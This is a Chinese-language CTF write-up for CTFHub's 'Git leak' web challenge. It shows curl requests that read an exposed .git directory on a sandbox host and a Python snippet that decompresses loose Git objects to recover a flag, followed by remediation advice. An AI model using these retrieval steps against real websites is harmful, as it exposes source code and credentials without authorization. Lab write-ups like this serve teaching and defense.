CTFHub - Web - 信息泄露 - Git泄露 #2

# CTFHub # Web # 信息泄露 # Git # loose object

一、题目信息

  • 题目名称：Git泄露
  • 题目方向：Web - 信息泄露
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目提示：网站使用 Git 进行版本控制；如果部署配置不当，线上的 .git 目录可能被直接公开。
  • 题目目标：获取泄露的 Git 对象，恢复源码并定位 flag。

二、漏洞原理

Git 仓库中的 .git 目录保存引用、配置、提交历史和对象数据库。如果发布网站时直接部署整个项目目录，且 Web 服务器没有拦截点开头的隐藏目录，攻击者就能访问 /.git/HEAD、/.git/refs/ 和 /.git/objects/。

Git 的 loose object 以 zlib 压缩形式存放在 .git/objects/<前2位>/<后38位>。从 HEAD 开始依次解析 commit、tree 和 blob，即可恢复仓库文件。即使敏感文件已从最新版本删除，也可能保留在历史对象中。

三、探测泄露

访问首页和 /.git/HEAD：

curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/"
curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/HEAD"

HEAD 返回了有效引用，说明仓库目录可被公开访问：

HTTP/1.1 200 OK
Content-Type: application/octet-stream

ref: refs/heads/master

四、读取提交与引用

读取 master 引用和提交日志：

curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/heads/master"
curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/logs/HEAD"

本轮环境中，master 指向的最新提交为：

d09b828f50d28343cbafa211d380fdcbf310e3bf

提交日志显示共有两次提交，第二次提交说明为 add flag：

fe8a3729c987902bb3ea852a3cc75a5f4aa05ef0  init
d09b828f50d28343cbafa211d380fdcbf310e3bf  add flag

请求 Git smart HTTP 接口时返回 404 Not Found，因此不能直接执行 git clone，需要按对象哈希逐个恢复：

curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/info/refs?service=git-upload-pack"

五、恢复 Git 对象

下载并解压 commit 对象后，可以取得对应的 tree：

commit d09b828f50d28343cbafa211d380fdcbf310e3bf
tree   55e6b59cf68599f3134d2bc116ae52286f246c88
parent fe8a3729c987902bb3ea852a3cc75a5f4aa05ef0

继续读取 tree 对象 55e6b59c...，解析出三个文件：

100644 49f04c9d7f959d70742a30b2593508210055eadb 34061640727815.txt
100644 9071e0a24f654c88aa97a2273ca595e301b7ada5 50x.html
100644 2c59e3024e3bc350976778204928a21d9ff42d01 index.html

随机数字命名的文本文件最可疑。下载 blob 49f04c9d...，使用 zlib 解压，并跳过 Git 的 blob 33\0 头部：

import zlib

raw = open("49f04c9d7f959d70742a30b2593508210055eadb", "rb").read()
header, payload = zlib.decompress(raw).split(b"\0", 1)
print(payload.decode())

文件 34061640727815.txt 的内容为：

ctfhub{153e312eea594df4c4b9483e}
若目标允许 Git dumb HTTP 或工具能够自动发现对象，也可以使用 BugScanTeam 的 GitHack。Git smart HTTP 被禁用且只暴露 loose object 时，按 commit → tree → blob 的关系手动下载是最直接的方法。

六、最终 Flag

ctfhub{153e312eea594df4c4b9483e}

七、修复建议

  • 禁止 Web 服务器访问 .git、.svn、.hg 等版本控制目录。
  • 部署时只发布构建产物，不要将开发仓库或完整源码目录直接暴露到 Web 根目录。
  • 使用 Nginx 或 Apache 显式拦截以点开头的隐藏文件和敏感路径。
  • 若密钥、密码或 flag 曾进入 Git 历史，仅删除当前文件并不安全，应立即轮换凭证并清理历史对象。

八、解题总结

本题的关键是确认 .git 泄露后，从 refs/heads/master 定位最新 commit，再解析 commit、tree 和 blob。即使服务端禁用了 git clone 所需的 smart HTTP，只要 loose object 可下载，就能完整恢复仓库内容并取得 flag。
